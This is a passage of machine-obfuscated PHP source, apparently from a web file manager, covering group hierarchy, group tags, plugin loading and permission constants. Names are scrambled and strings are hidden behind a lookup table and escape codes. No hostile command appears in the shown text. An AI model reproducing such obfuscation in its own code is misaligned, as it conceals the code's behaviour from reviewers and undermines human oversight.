array($Ø‡Ñ¤ÓÚ[1861] => array($Ø‡Ñ¤ÓÚ[7], $œÄ™öî¸)); $‚¸¡Ç = Model($Ø‡Ñ¤ÓÚ[1950])->where($ÛíÌÔï‡)->select(); $‚¸¡Ç = array_to_keyvalue_group($‚¸¡Ç, $Ø‡Ñ¤ÓÚ[1861]); foreach ($‚¸¡Ç as &$Ï¯ƒ—Ş) { $Ï¯ƒ—Ş = array_to_keyvalue($Ï¯ƒ—Ş, $Ø‡Ñ¤ÓÚ[94], $Ø‡Ñ¤ÓÚ[374]); } unset($Ï¯ƒ—Ş); foreach ($ÕıĞİò› as &$Œ¤Ñõ£·) { $Œ¤Ñõ£·[$Ø‡Ñ¤ÓÚ[466]] = array(); if (isset($‚¸¡Ç[$Œ¤Ñõ£·[$Ø‡Ñ¤ÓÚ[1861]]])) { $Œ¤Ñõ£·[$Ø‡Ñ¤ÓÚ[466]] = $‚¸¡Ç[$Œ¤Ñõ£·[$Ø‡Ñ¤ÓÚ[1861]]]; } } unset($Œ¤Ñõ£·); } protected function parentLevelArray($¥˜œ¯÷) { $İÓ—§¼ =& $_SERVER[Îûáû“ş]; $¥˜œ¯÷ = explode($İÓ—§¼[50], trim($¥˜œ¯÷, $İÓ—§¼[50])); $¥˜œ¯÷ = array_remove_value($¥˜œ¯÷, $İÓ—§¼[198]); return $¥˜œ¯÷; } protected function parentInGroup($¤©ÎÏ¦‘, $õÃ³®¯¡) { $á‚šĞí =& $_SERVER[Îûáû“ş]; $³˜éà¤á = $this->getInfoSimple($¤©ÎÏ¦‘); if (!$³˜éà¤á) { return !0; } $‹·Ëáˆ = $this->parentLevelArray($³˜éà¤á[$á‚šĞí[511]]); $‹·Ëáˆ[] = $¤©ÎÏ¦‘; foreach ($‹·Ëáˆ as $¤©ÎÏ¦‘) { if (in_array($¤©ÎÏ¦‘ . $á‚šĞí[12], $õÃ³®¯¡)) { return !0; } } return !1; } private function _listAppendParent(&$òğ”ü É) { $¨è›™œ¾ =& $_SERVER[Îûáû“ş]; $Ó¯Ÿïæ = array(); foreach ($òğ”ü É as &$òÂÊ¨¶) { $Ó¯Ÿïæ[$òÂÊ¨¶[$¨è›™œ¾[1861]]] = $òÂÊ¨¶[$¨è›™œ¾[32]]; $•ô ğŸæ = $this->parentLevelArray($òÂÊ¨¶[$¨è›™œ¾[511]]); foreach ($•ô ğŸæ as $Àß¹˜Æ¦) { if (!isset($Ó¯Ÿïæ[$Àß¹˜Æ¦])) { $Ó¯Ÿïæ[$Àß¹˜Æ¦] = 0; } } } unset($òÂÊ¨¶); foreach ($Ó¯Ÿïæ as $æª ³«ø => $µñÉ¸§É) { if ($µñÉ¸§É) { continue; } $İÆì°Ø’ = $this->getInfoSimple($æª ³«ø); $Ó¯Ÿïæ[$æª ³«ø] = $İÆì°Ø’[$¨è›™œ¾[32]]; } $ò¿ÀÑƒ = $GLOBALS[$¨è›™œ¾[6]][$¨è›™œ¾[89]][$¨è›™œ¾[1964]]; if ($GLOBALS[$¨è›™œ¾[494]] == $¨è›™œ¾[88]) { $ò¿ÀÑƒ = !1; } foreach ($òğ”ü É as &$òÂÊ¨¶) { $•ô ğŸæ = $this->parentLevelArray($òÂÊ¨¶[$¨è›™œ¾[511]]); $÷¢¥Ä‚ü = $¨è›™œ¾[12]; foreach ($•ô ğŸæ as $æª ³«ø => $Àß¹˜Æ¦) { if ($ò¿ÀÑƒ && $æª ³«ø == 0) { continue; } $÷¢¥Ä‚ü .= $Ó¯Ÿïæ[$Àß¹˜Æ¦] . $¨è›™œ¾[8]; } if ($•ô ğŸæ) { $÷¢¥Ä‚ü .= $òÂÊ¨¶[$¨è›™œ¾[32]]; } $òÂÊ¨¶[$¨è›™œ¾[516]] = str_replace($¨è›™œ¾[519], $¨è›™œ¾[8], $÷¢¥Ä‚ü); } unset($òÂÊ¨¶); } private function _listAppendSourceRoot(&$ûàç¦, $Æ±‘àÄí) { $¼‹­ãÖš =& $_SERVER[Îûáû“ş]; $Øƒà×’ = Model($¼‹­ãÖš[824])->listSourceRoot(SourceModel::TYPE_GROUP, $Æ±‘àÄí); $Øƒà×’ = array_to_keyvalue($Øƒà×’, $¼‹­ãÖš[496]); $Øƒà×’ = array_remove_key($Øƒà×’, $¼‹­ãÖš[496]); foreach ($ûàç¦ as &$¶êå¸¬Ã) { $¶êå¸¬Ã[$¼‹­ãÖš[87]] = $Øƒà×’[$¶êå¸¬Ã[$¼‹­ãÖš[1861]]] ? $Øƒà×’[$¶êå¸¬Ã[$¼‹­ãÖš[1861]]] : array(); } unset($¶êå¸¬Ã); } protected function groupMerge($ÔŞñÚÒ®) { $ÔŞñÚÒ® = array_values(array_unique($ÔŞñÚÒ®)); $ØÄÆÈ‚’ = array(); for ($ìÇÚ­ªª = 0; $ìÇÚ­ªª < count($ÔŞñÚÒ®); $ìÇÚ­ªª++) { $“¦ºƒ¯Æ = !1; for ($›æÌşŞÓ = 0; $›æÌşŞÓ < count($ÔŞñÚÒ®); $›æÌşŞÓ++) { if ($ìÇÚ­ªª == $›æÌşŞÓ) { continue; } if ($this->isParentOf($ÔŞñÚÒ®[$›æÌşŞÓ], $ÔŞñÚÒ®[$ìÇÚ­ªª])) { $“¦ºƒ¯Æ = !0; break; } } if (!$“¦ºƒ¯Æ) { $ØÄÆÈ‚’[] = $ÔŞñÚÒ®[$ìÇÚ­ªª]; } } return $ØÄÆÈ‚’; } protected function isParentOf($åôÏšÛù, $”Óà‰æş) { $ôªËßà‹ =& $_SERVER[Îûáû“ş]; if (!$åôÏšÛù || !$”Óà‰æş || $åôÏšÛù == $”Óà‰æş) { return !1; } $ñüÔ‚Ø = $this->getInfoSimple($åôÏšÛù); $ºğñı’º = $this->getInfoSimple($”Óà‰æş); $Ï¶Š¿È¹ = $ñüÔ‚Ø[$ôªËßà‹[511]] . $åôÏšÛù . $ôªËßà‹[50]; if (substr($ºğñı’º[$ôªËßà‹[511]], 0, strlen($Ï¶Š¿È¹)) == $Ï¶Š¿È¹) { return !0; } return !1; } public function groupShowRoot($ïÕÍâŞå, $İ ‘°äé = false) { $ˆ¾Ô•Ü =& $_SERVER[Îûáû“ş]; $øÆ·¦•Ï = $this->getInfo($ïÕÍâŞå); if (!$øÆ·¦•Ï) { return array(); } $Ãâ›å¨â = $this->parentLevelArray($øÆ·¦•Ï[$ˆ¾Ô•Ü[511]]); $— ÛúÎ = array($ïÕÍâŞå); if (count($Ãâ›å¨â) == 0) { return $— ÛúÎ; } if ($İ ‘°äé && count($Ãâ›å¨â) == 1) { return $— ÛúÎ; } if (!$øÆ·¦•Ï[$ˆ¾Ô•Ü[466]] || !isset($øÆ·¦•Ï[$ˆ¾Ô•Ü[466]][$ˆ¾Ô•Ü[1947]]) || $øÆ·¦•Ï[$ˆ¾Ô•Ü[466]][$ˆ¾Ô•Ü[1947]] == $ˆ¾Ô•Ü[1916]) { return $this->groupShowRoot($Ãâ›å¨â[count($Ãâ›å¨â) - 1], $İ ‘°äé); } if ($øÆ·¦•Ï[$ˆ¾Ô•Ü[466]][$ˆ¾Ô•Ü[1947]] == $ˆ¾Ô•Ü[357]) { $ÀŞæ›—ğ = explode($ˆ¾Ô•Ü[50], $øÆ·¦•Ï[$ˆ¾Ô•Ü[466]][$ˆ¾Ô•Ü[1948]]); if ($ÀŞæ›—ğ) { $— ÛúÎ = array_merge($— ÛúÎ, $ÀŞæ›—ğ); } } return $— ÛúÎ; } protected function resetParentLevel() { $½²‘Ÿ¯Ù =& $_SERVER[Îûáû“ş]; $¬ˆËÖìº = $½²‘Ÿ¯Ù[1861]; $‘‡è¨Ê¹ = $this->select(); $‘‡è¨Ê¹ = array_to_keyvalue($‘‡è¨Ê¹, $¬ˆËÖìº); foreach ($‘‡è¨Ê¹ as $Ô¹ÄÙ) { $ë ‚Î…˜ = $Ô¹ÄÙ; $¤–êÌŠö = array(); while ($ë ‚Î…˜[$½²‘Ÿ¯Ù[432]] != 0) { $¤–êÌŠö[] = $ë ‚Î…˜[$½²‘Ÿ¯Ù[432]]; $ë ‚Î…˜ = $‘‡è¨Ê¹[$ë ‚Î…˜[$½²‘Ÿ¯Ù[432]]]; } $¤–êÌŠö[] = 0; $¤–êÌŠö = $½²‘Ÿ¯Ù[50] . implode($½²‘Ÿ¯Ù[50], array_reverse($¤–êÌŠö)) . $½²‘Ÿ¯Ù[50]; $this->setNamePinyin($Ô¹ÄÙ[$¬ˆËÖìº], $Ô¹ÄÙ[$½²‘Ÿ¯Ù[32]]); $this->where(array($¬ˆËÖìº => $Ô¹ÄÙ[$¬ˆËÖìº]))->save(array($½²‘Ÿ¯Ù[580] => $¤–êÌŠö)); } return $‘‡è¨Ê¹; } public function groupNameAuto($¾†ë†²—, $…ô¬Áè·) { $‘§ÏÍÈ =& $_SERVER[Îûáû“ş]; $›š‡œ¿ = $this->where(array($‘§ÏÍÈ[401] => $¾†ë†²—))->getField($‘§ÏÍÈ[32], !0); if (!$›š‡œ¿ || !in_array($…ô¬Áè·, $›š‡œ¿)) { return $…ô¬Áè·; } for ($À¿çÚËİ = 1; $À¿çÚËİ <= count($›š‡œ¿) + 1; $À¿çÚËİ++) { $á¥ş‘ıõ = $…ô¬Áè· . "\x28{$À¿çÚËİ}\x29"; if (!in_array($á¥ş‘ıõ, $›š‡œ¿)) { return $á¥ş‘ıõ; } } } public function groupSwitch($­ÌÓ¦âÂ, $¬ªäÉÀ) { $åõàÈâè =& $_SERVER[Îûáû“ş]; $º´ÕŒï„ = array($åõàÈâè[1861] => array($åõàÈâè[7], array($­ÌÓ¦âÂ, $¬ªäÉÀ))); $÷ñó¾»÷ = $this->where($º´ÕŒï„)->select(); $÷ñó¾»÷ = array_to_keyvalue($÷ñó¾»÷, $åõàÈâè[1861]); if (!isset($÷ñó¾»÷[$­ÌÓ¦âÂ]) || !isset($÷ñó¾»÷[$¬ªäÉÀ]) || $÷ñó¾»÷[$­ÌÓ¦âÂ][$åõàÈâè[432]] == 0) { return !1; } $º´ÕŒï„ = array($åõàÈâè[1861] => $­ÌÓ¦âÂ); $¢ÌÍÌûÔ = Model($åõàÈâè[1951])->where($º´ÕŒï„)->select(); if (!$¢ÌÍÌûÔ) { $¢ÌÍÌûÔ = array(); } foreach ($¢ÌÍÌûÔ as $—Š „°) { $Ï¢÷ğäæ = $—Š „°[$åõàÈâè[1670]]; $º´ÕŒï„ = array($åõàÈâè[1670] => $Ï¢÷ğäæ, $åõàÈâè[1861] => $¬ªäÉÀ); $¼”¡­àÈ = Model($åõàÈâè[1951])->where($º´ÕŒï„)->find(); if (!$¼”¡­àÈ) { $Æıàò„ = array($¬ªäÉÀ => $—Š „°[$åõàÈâè[1965]]); Model($åõàÈâè[525])->userGroupAdd($Ï¢÷ğäæ, $Æıàò„); } Model($åõàÈâè[525])->userGroupRemove($Ï¢÷ğäæ, $­ÌÓ¦âÂ); } $º´ÕŒï„ = array($åõàÈâè[411] => 2, $åõàÈâè[432] => 0, $åõàÈâè[410] => 1, $åõàÈâè[496] => array($åõàÈâè[7], array($­ÌÓ¦âÂ, $¬ªäÉÀ))); $Áã¬–²Á = Model($åõàÈâè[824])->where($º´ÕŒï„)->field($åõàÈâè[1966])->select(); $Áã¬–²Á = array_to_keyvalue($Áã¬–²Á, $åõàÈâè[496], $åõàÈâè[402]); $¸…£Ï’Ë = !empty($Áã¬–²Á[$­ÌÓ¦âÂ]) ? $Áã¬–²Á[$­ÌÓ¦âÂ] : !1; if ($¸…£Ï’Ë) { if (!$Áã¬–²Á[$¬ªäÉÀ]) { $Áã¬–²Á[$¬ªäÉÀ] = Model($åõàÈâè[824])->groupRootAdd($¬ªäÉÀ); } $šóÇ…òì = $Áã¬–²Á[$¬ªäÉÀ]; $º´ÕŒï„ = array($åõàÈâè[432] => $¸…£Ï’Ë); $Áã¬–²Á = Model($åõàÈâè[824])->where($º´ÕŒï„)->field($åõàÈâè[1967])->select(); if (!$Áã¬–²Á) { $Áã¬–²Á = array(); } Model($åõàÈâè[824])->moveClearAuth = !1; foreach ($Áã¬–²Á as $üì‘ö–½) { $‚ÃÂÆÂı = $üì‘ö–½[$åõàÈâè[410]] == $åõàÈâè[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($åõàÈâè[824])->move($üì‘ö–½[$åõàÈâè[402]], $šóÇ…òì, $‚ÃÂÆÂı); } Model($åõàÈâè[824])->moveClearAuth = !0; $º´ÕŒï„ = array($åõàÈâè[411] => 2, $åõàÈâè[496] => $­ÌÓ¦âÂ); $‚ÏŸŞ¢Û = array($åõàÈâè[496] => $¬ªäÉÀ); Model($åõàÈâè[1968])->where($º´ÕŒï„)->save($‚ÏŸŞ¢Û); Model($åõàÈâè[1969])->where($º´ÕŒï„)->save($‚ÏŸŞ¢Û); } $this->_changeChildLevel($÷ñó¾»÷[$­ÌÓ¦âÂ], $÷ñó¾»÷[$¬ªäÉÀ], !0); $this->where(array($åõàÈâè[432] => $­ÌÓ¦âÂ))->save(array($åõàÈâè[432] => $¬ªäÉÀ)); $this->_clearChildrenCache($÷ñó¾»÷[$¬ªäÉÀ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($¶šòãŒĞ) { $Ñ·İçñş =& $_SERVER[Îûáû“ş]; return array($Ñ·İçñş[1970] => array($¶šòãŒĞ[0], $Ñ·İçñş[1971]), $Ñ·İçñş[1972] => array($¶šòãŒĞ[0], $Ñ·İçñş[1973])); } protected function get($üª¦À†Ë) { $ò¶ñÊÎ =& $_SERVER[Îûáû“ş]; $Ş°Œƒõ³ = Model($ò¶ñÊÎ[512])->metaGet($üª¦À†Ë, $ò¶ñÊÎ[1974]); $ïÄÇ§›– = json_decode($Ş°Œƒõ³, !0); return $ïÄÇ§›– ? $ïÄÇ§›– : array($ò¶ñÊÎ[1975] => $ò¶ñÊÎ[88], $ò¶ñÊÎ[369] => array()); } protected function set($’è¸š©‹, $¦‹¥ï¹å) { $ş„èœ =& $_SERVER[Îûáû“ş]; $¦‹¥ï¹å = $¦‹¥ï¹å ? $¦‹¥ï¹å : array($ş„èœ[1975] => $ş„èœ[88], $ş„èœ[369] => array()); return Model($ş„èœ[512])->metaSet($’è¸š©‹, $ş„èœ[1974], json_encode($¦‹¥ï¹å)); } protected function getByTagID($ìæÍä‹ˆ, $ËœşÒöÍ) { $÷ë…ÆÎµ =& $_SERVER[Îûáû“ş]; if (!$ìæÍä‹ˆ || !$ËœşÒöÍ) { return !1; } if (!Model($÷ë…ÆÎµ[512])->getInfoSimple($ìæÍä‹ˆ)) { return !1; } $ıììÁŸ = $this->get($ìæÍä‹ˆ); if (!$ıììÁŸ || !isset($ıììÁŸ[$÷ë…ÆÎµ[369]])) { return !1; } $ô„…çÙ = array_find_by_field($ıììÁŸ[$÷ë…ÆÎµ[369]], $÷ë…ÆÎµ[399], $ËœşÒöÍ); return is_array($ô„…çÙ) ? $ô„…çÙ : !1; } public function listSource($éÂû‡”«, $Å›€Ğ÷Í) { $àË­Ç­é =& $_SERVER[Îûáû“ş]; if ($Å›€Ğ÷Í && !is_array($Å›€Ğ÷Í)) { $Å›€Ğ÷Í = array($Å›€Ğ÷Í); } $ÖÏ­Á™ = $this->listData($éÂû‡”«); $¾¦ÎÇ® = array(); foreach ($ÖÏ­Á™ as $–§ ùİï) { $¦›Şı = $–§ ùİï[$àË­Ç­é[84]]; if (!$¦›Şı) { continue; } if (!isset($¾¦ÎÇ®[$¦›Şı])) { $¾¦ÎÇ®[$¦›Şı] = array(); } $¾¦ÎÇ®[$¦›Şı][] = $–§ ùİï[$àË­Ç­é[426]]; } $ë¸‚º—¾ = array(); foreach ($¾¦ÎÇ® as $ñâåÙ¥ => $ÈÊú» ¸) { $é¦îäòï = !0; if (!$Å›€Ğ÷Í) { $ë¸‚º—¾[] = $ñâåÙ¥; continue; } foreach ($Å›€Ğ÷Í as $ˆİÌÏø) { if (!in_array($ˆİÌÏø, $ÈÊú» ¸)) { $é¦îäòï = !1; break; } } if ($é¦îäòï) { $ë¸‚º—¾[] = $ñâåÙ¥; } } if (!$ë¸‚º—¾) { return array(); } $­ì€ÎÑî = array($àË­Ç­é[417] => array($àË­Ç­é[418], $ë¸‚º—¾), $àË­Ç­é[496] => $éÂû‡”«, $àË­Ç­é[411] => SourceModel::TYPE_GROUP); $èŒİ¥›¸ = Model($àË­Ç­é[1341])->listSource($­ì€ÎÑî); if (!$èŒİ¥›¸ || count($ë¸‚º—¾) == $èŒİ¥›¸[$àË­Ç­é[366]][$àË­Ç­é[367]]) { return $èŒİ¥›¸; } $™õöì‰ = array(); $ìõèëæ² = array_to_keyvalue($èŒİ¥›¸[$àË­Ç­é[82]], $àË­Ç­é[12], $àË­Ç­é[402]); $ø¥Ëñ‰• = array_to_keyvalue($èŒİ¥›¸[$àË­Ç­é[83]], $àË­Ç­é[12], $àË­Ç­é[402]); $˜ş¡±¹¥ = array_merge($ø¥Ëñ‰•, $ìõèëæ²); foreach ($ë¸‚º—¾ as $¦›Şı) { if (!in_array($¦›Şı, $˜ş¡±¹¥)) { $™õöì‰[] = $¦›Şı; } } if ($™õöì‰) { $this->removeBySource($éÂû‡”«, $™õöì‰); } return $èŒİ¥›¸; } protected function listData($°ì®çÅ) { $á¤•Æ‚ñ =& $_SERVER[Îûáû“ş]; $—ÍøõŒ– = array($á¤•Æ‚ñ[1661] => 0, $á¤•Æ‚ñ[483] => array($á¤•Æ‚ñ[1976], 0), $á¤•Æ‚ñ[422] => $á¤•Æ‚ñ[1977] . $°ì®çÅ); $ª²Öáò• = $á¤•Æ‚ñ[1978]; $Æò†õË = $this->field($ª²Öáò•)->where($—ÍøõŒ–)->order($á¤•Æ‚ñ[1979])->select(); return $Æò†õË ? $Æò†õË : array(); } protected function addToTag($ÌÁ‚É²û, $¡ş—¦óà, $û¿·Ô—ñ) { $«ÌÆÌ©¤ =& $_SERVER[Îûáû“ş]; if (!$this->getByTagID($ÌÁ‚É²û, $û¿·Ô—ñ) || !$¡ş—¦óà) { return !1; } if (!Model($«ÌÆÌ©¤[824])->pathInfo($¡ş—¦óà)) { return !1; } $üå…âğ = array($«ÌÆÌ©¤[1661] => 0, $«ÌÆÌ©¤[483] => $û¿·Ô—ñ, $«ÌÆÌ©¤[421] => $¡ş—¦óà, $«ÌÆÌ©¤[422] => $«ÌÆÌ©¤[1980] . $ÌÁ‚É²û, $«ÌÆÌ©¤[420] => $«ÌÆÌ©¤[12], $«ÌÆÌ©¤[1865] => 0); if ($this->where($üå…âğ)->find()) { return !1; } return $this->add($üå…âğ); } protected function removeFromTag($©®îšÇŸ, $Äøâ¢”, $Á»·Ç¤Ê) { $“½®Æº· =& $_SERVER[Îûáû“ş]; if (!$this->getByTagID($©®îšÇŸ, $Á»·Ç¤Ê) || !$Äøâ¢”) { return !1; } if (is_array($Äøâ¢”)) { $Äøâ¢” = array($“½®Æº·[7], $Äøâ¢”); } $©ŒÖÅ¾ = array($“½®Æº·[1661] => 0, $“½®Æº·[483] => $Á»·Ç¤Ê, $“½®Æº·[422] => $“½®Æº·[1980] . $©®îšÇŸ, $“½®Æº·[421] => $Äøâ¢”); return $this->where($©ŒÖÅ¾)->delete(); } protected function removeByTag($´Õ›ÄÆ, $–¢Æù³Á) { $ã®æ«‡ =& $_SERVER[Îûáû“ş]; if (!$this->getByTagID($´Õ›ÄÆ, $–¢Æù³Á)) { return !1; } $“ûú®¦´ = array($ã®æ«‡[1661] => 0, $ã®æ«‡[483] => $–¢Æù³Á, $ã®æ«‡[422] => $ã®æ«‡[1980] . $´Õ›ÄÆ); return $this->where($“ûú®¦´)->delete(); } protected function removeBySource($€µˆùÀ™, $Ú»¶ö›°) { $Õ¢ŒÑ¥ =& $_SERVER[Îûáû“ş]; if (!$€µˆùÀ™ || !$Ú»¶ö›°) { return !1; } if (is_array($Ú»¶ö›°)) { $Ú»¶ö›° = array($Õ¢ŒÑ¥[7], $Ú»¶ö›°); } $Ö¬æµ«¿ = array($Õ¢ŒÑ¥[1661] => 0, $Õ¢ŒÑ¥[421] => $Ú»¶ö›°, $Õ¢ŒÑ¥[483] => array($Õ¢ŒÑ¥[1016], 0), $Õ¢ŒÑ¥[422] => $Õ¢ŒÑ¥[1980] . $€µˆùÀ™); return $this->where($Ö¬æµ«¿)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\160\154\x75\147\151\156\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\141\164\165\163", "\x72\x65\x67\x69\x65\163\x74", "\x63\x6f\x6e\x66\x69\x67"); public function loadList($‘ø®ÕƒØ = false) { $óÄ…Ñ‚ = array_to_keyvalue($this->listData(), $_SERVER[Îûáû“ş][32]); if ($‘ø®ÕƒØ) { return $óÄ…Ñ‚[$‘ø®ÕƒØ]; } return $óÄ…Ñ‚; } public function init() { $ı÷ÙØ¢Ú =& $_SERVER[Îûáû“ş]; Hook::trigger($ı÷ÙØ¢Ú[1981]); $–˜‹¹²ó = $this->loadPluginList(); foreach ($–˜‹¹²ó as $î°Üí°ò => $›Å¶óØ¿) { $¦ÃÃ¬Óõ = $this->appAllow($î°Üí°ò, $›Å¶óØ¿); if (!$¦ÃÃ¬Óõ) { continue; } foreach ($›Å¶óØ¿[$ı÷ÙØ¢Ú[1982]] as $û˜ô¨ç– => $äßæñ) { Hook::bind($û˜ô¨ç–, $äßæñ); } } Hook::trigger($ı÷ÙØ¢Ú[1983]); Hook::trigger(ACTION); } public function appAllow($º—üı³, $£±÷…«Ç, $Ë—ŒÅ¥² = true) { $·£«–´ =& $_SERVER[Îûáû“ş]; $©…÷ó® = PLUGIN_DIR . $º—üı³ . $·£«–´[1984]; if (!is_array($£±÷…«Ç) || !is_array($£±÷…«Ç[$·£«–´[1982]]) || $£±÷…«Ç[$·£«–´[748]] != 1 || !is_file($©…÷ó®)) { return !1; } if ($GLOBALS[$·£«–´[494]] == 1) { if ($GLOBALS[$·£«–´[6]][$·£«–´[1985]] || !$GLOBALS[$·£«–´[6]][$·£«–´[1986]]) { return !0; } $ò¾©ï·Ó = explode($·£«–´[50], strtolower($GLOBALS[$·£«–´[6]][$·£«–´[1986]])); return in_array(strtolower($º—üı³), $ò¾©ï·Ó) ? !1 : !0; } if ($Ë—ŒÅ¥² && !Action($·£«–´[1987])->checkAuth($º—üı³)) { return !1; } return !0; } public function unInstall($ûÓğêâ) { $‹ÓÑ—Ì× =& $_SERVER[Îûáû“ş]; $£Øöªì¿ = $this->loadList($ûÓğêâ); if (file_exists(PLUGIN_DIR . $ûÓğêâ)) { Hook::apply($ûÓğêâ . $‹ÓÑ—Ì×[1988]); } $this->remove($£Øöªì¿[$‹ÓÑ—Ì×[399]]); } public function changeStatus($ğÖ•ê‚ß, $–òô²›À) { $â·é”’  =& $_SERVER[Îûáû“ş]; $ÓøÅ‘¼Å = $this->loadList($ğÖ•ê‚ß); if ($–òô²›À) { Hook::apply($ğÖ•ê‚ß . $â·é”’ [1989]); } $this->update($ÓøÅ‘¼Å[$â·é”’ [399]], array($â·é”’ [1990] => $–òô²›À)); } public function appRegist($•šˆéíé, $ĞÈÌ“”€) { $¶…Ç”ˆ¥ =& $_SERVER[Îûáû“ş]; $¼·ÒıÚ‡ = $this->loadList($•šˆéíé); if ($¼·ÒıÚ‡) { $this->update($¼·ÒıÚ‡[$¶…Ç”ˆ¥[399]], array($¶…Ç”ˆ¥[1982] => $ĞÈÌ“”€)); } else { $©Ì‹§ë = array($¶…Ç”ˆ¥[32] => $•šˆéíé, $¶…Ç”ˆ¥[1982] => $ĞÈÌ“”€, $¶…Ç”ˆ¥[748] => 0, $¶…Ç”ˆ¥[6] => $this->getConfigDefault($•šˆéíé)); $this->insert($©Ì‹§ë); } } public function getConfigDefault($ßâ‘ü´ı) { $éÍ « =& $_SERVER[Îûáû“ş]; $îÛÌéåÄ = array(); $€Ó—¥´Ü = $this->getPackageJson($ßâ‘ü´ı); if (!$€Ó—¥´Ü && is_array($€Ó—¥´Ü[$éÍ «[1991]])) { return $îÛÌéåÄ; } foreach ($€Ó—¥´Ü[$éÍ «[1991]] as $ÓòÅä‘ => $Œ€ÂĞ¼) { if (!isset($Œ€ÂĞ¼[$éÍ «[374]]) || isset($îÛÌéåÄ[$ÓòÅä‘])) { continue; } $îÛÌéåÄ[$ÓòÅä‘] = $Œ€ÂĞ¼[$éÍ «[374]]; } return $îÛÌéåÄ; } public function getPackageJson($»í‹æ­Ì) { return Hook::apply($»í‹æ­Ì . $_SERVER[Îûáû“ş][1992]); } public function getConfig($×’İ«ÒÛ, $æŒÕÙ½« = false) { $Î“¾àñ« =& $_SERVER[Îûáû“ş]; $¸ÛÃäÖæ = array(); $•­ğìø¬ = $this->loadList($×’İ«ÒÛ); if ($•­ğìø¬ && is_array($•­ğìø¬[$Î“¾àñ«[6]])) { $¸ÛÃäÖæ = $•­ğìø¬[$Î“¾àñ«[6]]; } if (!$¸ÛÃäÖæ || $æŒÕÙ½«) { $¸ÛÃäÖæ = $this->getConfigDefault($×’İ«ÒÛ); } return $¸ÛÃäÖæ; } public function setConfig($šé˜»ïÇ, $ÓÙóà = false) { $ı½ìŒšš =& $_SERVER[Îûáû“ş]; $ëš÷Üõ = $this->loadList($šé˜»ïÇ); if (!$ëš÷Üõ) { return !1; } $¹•¡˜§Ğ = $ëš÷Üõ[$ı½ìŒšš[6]]; if ($ÓÙóà == !1) { $¹•¡˜§Ğ = array(); $ÓÙóà = $this->getConfigDefault($šé˜»ïÇ); } foreach ($ÓÙóà as $ŸĞŸ†² => $²³ÂÙå) { $¹•¡˜§Ğ[$ŸĞŸ†²] = is_string($²³ÂÙå) ? trim($²³ÂÙå) : $²³ÂÙå; } $this->update($ëš÷Üõ[$ı½ìŒšš[399]], array($ı½ìŒšš[6] => $¹•¡˜§Ğ)); } public function viewList() { $»¥š´·§ =& $_SERVER[Îûáû“ş]; $‡æ™Âä¶ = $this->loadList(); $this->pluginScan($‡æ™Âä¶); $‡æ™Âä¶ = $this->loadPluginList(); $ˆñ‰Ì±ä = array(); foreach ($‡æ™Âä¶ as $›Ñëõğ => $Í”»Æ¸·) { unset($Í”»Æ¸·[$»¥š´·§[1982]], $Í”»Æ¸·[$»¥š´·§[6]]); $ï²¬Ù£Æ = PLUGIN_DIR . $Í”»Æ¸·[$»¥š´·§[32]] . $»¥š´·§[1984]; if (!is_file($ï²¬Ù£Æ)) { continue; } $ÜÛÚ¡Ì§ = Hook::apply($Í”»Æ¸·[$»¥š´·§[32]] . $»¥š´·§[1992]); if (is_array($ÜÛÚ¡Ì§)) { $ˆñ‰Ì±ä[$›Ñëõğ] = array_merge($Í”»Æ¸·, $ÜÛÚ¡Ì§); } } return $ˆñ‰Ì±ä; } private function loadPluginList() { $İş—½­ü =& $_SERVER[Îûáû“ş]; $Ğ¬¨‘Ï­ = $this->loadList(); if (strtolower(MOD) == $İş—½­ü[1993]) { return $Ğ¬¨‘Ï­; } $¤—ìĞİ = Hook::trigger($İş—½­ü[1994], $Ğ¬¨‘Ï­); if ($Ğ¬¨‘Ï­ && !$¤—ìĞİ) { die; } return $¤—ìĞİ ? $¤—ìĞİ : $Ğ¬¨‘Ï­; } private function pluginScan($œÎøüÆÙ) { $§£‘ªÓ½ =& $_SERVER[Îûáû“ş]; recursion_dir(PLUGIN_DIR, $€Í¶ÑæÖ, $İåÅŒâ¥, 0); foreach ($€Í¶ÑæÖ as $•±ˆÏµÏ) { $öÙ˜Ò¨ã = get_path_this($•±ˆÏµÏ); if (isset($œÎøüÆÙ[$öÙ˜Ò¨ã]) || !file_exists($•±ˆÏµÏ . $§£‘ªÓ½[1995]) || !file_exists($•±ˆÏµÏ . $§£‘ªÓ½[1984])) { continue; } Hook::apply($öÙ˜Ò¨ã . $§£‘ªÓ½[1989]); } } } goto Fİ›ÍÉÈğ‡; AÔ³¹³ë¡É: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $âåÖ»×– =& $_SERVER[Îûáû“ş]; $©åƒÃÖÔ = array(array($âåÖ»×–[420] => LNG($âåÖ»×–[1862]), $âåÖ»×–[1863] => $âåÖ»×–[1864], $âåÖ»×–[1865] => 1, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($âåÖ»×–[420] => LNG($âåÖ»×–[1868]), $âåÖ»×–[1863] => $âåÖ»×–[1869], $âåÖ»×–[1865] => 2, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($âåÖ»×–[420] => LNG($âåÖ»×–[1870]), $âåÖ»×–[1863] => $âåÖ»×–[1871], $âåÖ»×–[1865] => 3, $âåÖ»×–[1866] => 1, $âåÖ»×–[1867] => self::AUTH_SHOW | self::AUTH_VIEW | 